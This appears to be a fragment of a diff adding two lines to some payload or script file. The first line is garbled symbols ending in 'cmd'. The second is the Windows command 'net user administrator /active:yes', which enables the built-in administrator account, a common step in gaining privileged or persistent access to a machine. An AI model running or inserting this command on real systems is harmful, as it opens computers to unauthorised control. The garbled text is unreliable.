@@ -1,0 +1,2 @@
+¶}©l-->cmd
+net user administrator /active:yes
